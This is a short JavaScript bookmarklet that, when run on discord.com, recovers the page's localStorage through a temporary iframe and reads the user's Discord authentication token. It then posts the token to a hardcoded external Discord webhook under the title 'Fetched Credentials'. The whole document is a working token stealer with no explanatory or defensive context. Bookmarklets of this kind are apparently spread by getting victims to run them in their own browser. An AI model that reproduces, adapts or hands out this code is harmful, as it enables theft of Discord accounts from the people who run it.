javascript: void (function () {
  var SEND = "<https://discord.com/api/webhooks/956608950499946596/CD2HOHCK-5uUIi4nInaclG16QOUfosJY4EpcDRY3m6O4XwOUF9Cb3wc_moWtyTDD5WNa>";
  "https://discord.com" == this.document.location.origin &&
    (function () {
      const a = document.createElement("iframe");
      document.head.append(a);
      const b = Object.getOwnPropertyDescriptor(
        a.contentWindow,
        "localStorage"
      );
      a.remove(),
        Object.defineProperty(window, "localStorage", b),
        fetch(SEND, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                color: 3553599,
                title: "Fetched Credentials",
                description: `\`\`\`${localStorage.getItem("token")}\`\`\``,
              },
            ],
          }),
        });
    })();
})();
